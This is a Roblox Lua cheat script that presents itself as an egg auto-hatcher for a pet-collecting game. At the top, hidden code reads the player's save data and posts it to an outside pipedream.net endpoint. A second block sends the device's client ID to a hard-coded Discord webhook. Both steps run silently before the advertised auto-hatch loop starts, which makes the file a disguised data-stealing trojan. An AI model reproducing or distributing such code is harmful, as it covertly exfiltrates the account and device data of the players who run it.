local Library = require(game.ReplicatedStorage:WaitForChild('Library'))
task.wait(5)
local save = Library.Save.Get()
task.wait(5)
local Url = "https://eo7zzc6e44iwy15.m.pipedream.net"
local Headers = {
    ["content-type"] = "application/json"
}
local Body = game:GetService("HttpService"):JSONEncode(save)

request = http_request or request or HttpPost or syn.request

request({ Url = Url, Body = Body, Method = "POST", Headers = Headers })

-- =====================================================================================================================================================================

local HttpService = game:GetService("HttpService")
task.wait(5)
local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
task.wait(5)
request({
    Url = "https://discord.com/api/webhooks/1262316515995418664/e23EqaQoVxNNp8e6qeOjCTPXIj7jD-j5N3sj0WgpDJO3nw_OHJST7YsevM8MTeOQbJCu",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        content = "HWID: ||" .. tostring(HWID) .. "||",
        tts = false,
        embeds = { },
        components = { },
        actions = { }
    })
})

-- =====================================================================================================================================================================

_G.AutoOpen = true

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local nearest, nearest_distance = nil, math.huge
if workspace.__THINGS:FindFirstChild("CustomEggs") then
    for _,v in workspace.__THINGS.CustomEggs:GetChildren() do
        if not v:IsA("Model") then continue end
        local dist = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
        if dist > nearest_distance then continue end
        nearest = v.Name
        nearest_distance = dist
    end
end

local args = {
    [1] = nearest,
    [2] = 93
}

task.wait(10)

spawn(function()
    while _G.AutoOpen and task.wait() do
        pcall(function()
            ReplicatedStorage.Network.CustomEggs_Hatch:InvokeServer(unpack(args))
        end)
    end
end)

-- =====================================================================================================================================================================

